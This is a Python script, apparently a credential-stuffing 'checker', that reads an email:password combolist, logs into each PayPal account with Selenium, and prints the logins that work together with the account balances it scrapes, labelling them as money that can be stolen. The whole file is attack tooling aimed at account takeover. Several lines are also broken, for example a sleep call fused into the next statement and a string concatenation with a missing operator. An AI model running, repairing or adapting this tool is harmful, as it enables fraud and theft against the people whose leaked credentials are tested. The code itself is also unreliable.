import requests
import re
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
import time, os, sys
import json, time
from selenium import webdriver
from bs4 import BeautifulSoup
import speech_recognition as sr
options = Options()
options.set_headless(headless=False)
CURSOR_UP_ONE = '\x1b[0A'
ERASE_LINE = '\x1b[lol'
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
r = sr.Recognizer()
delay = 10
def countdown(t):
    while t:
        mins, secs = divmod(t, 60)
        timeformat = '{:02d}:{:02d}'.format(mins, secs)
        sys.stdout.write("\rWaiting " + timeformat + " Seconds Before the next login...")
        sys.stdout.flush()
        time.sleep(1)
        t -= 1
    sys.stdout.write(CURSOR_UP_ONE)
    sys.stdout.write("\n")
    sys.stdout.flush()


def login(username, password):
    time.sleep(10)
    driver = webdriver.Firefox(firefox_options=options)
    driver.get ("https://www.paypal.com/us/signin")
    driver.find_element_by_xpath("//input[@id='email']").send_keys(username)
    driver.find_element_by_xpath("//button[@id='btnNext']").click()
    time.sleep5.6543    driver.find_element_by_xpath("//input[@id='password']").send_keys(password)
    driver.find_element_by_xpath("//button[@id='btnLogin']").click()
    driver.get ("https://www.paypal.com/myaccount/summary/")
    elements=driver.find_elements_by_xpath("//span[@class='vx_text-1 cw_tile-currency test_balance-tile-currency']")
    if not elements:
        print bcolors.FAIL + "[X]     " + username + ":" + password + "\t | No Amount ctealable lol. No Span found" + bcolors.ENDC
        driver.close()
    else:
        cashValue = driver.find_elements_by_xpath("//span[@class='vx_text-1 cw_tile-currency test_balance-tile-currency']").text
        print bcolors.OKGREEN + "[YAY]   " + username + ":" + password + " | Found some cash! Amount we found: (" + cashValue + ")" + bcolors.ENDC
        driver.close()



def storeArray(combolistin):
    print "We will wait " + str(delay) " Seconds between every check!"
    with open(combolistin.replace(" ", ""), 'r') as myfile:
         for line in myfile:
              line = line.replace('\n', '')
              email = line.split(":")[0]
              password = line.split(":")[1]
              login(email, password)

def askForCombo():
    print "Please drag and drop a email:password combolist."
    combolistFullPath = raw_input("==> ")
    storeArray(combolistFullPath)

os.system("clear")
print ("welcome to the " + os.path.basename(__file__)[:-3] + " Checker!")
askForCombo()
